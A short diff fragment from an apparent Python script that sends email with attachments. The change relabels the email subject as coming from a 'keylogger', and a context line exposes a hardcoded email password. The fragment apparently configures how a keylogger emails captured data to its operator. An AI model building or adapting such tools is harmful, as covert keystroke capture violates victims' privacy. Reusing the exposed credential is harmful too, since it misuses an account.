@@ -24,7 +24,7 @@ pswd = "kyinglndyaivznpe"
 
 
 # name the email subject
-subject = "New email from TIE with attachments!!"
+subject = "New attachments from keylogger!!"
 
 
 
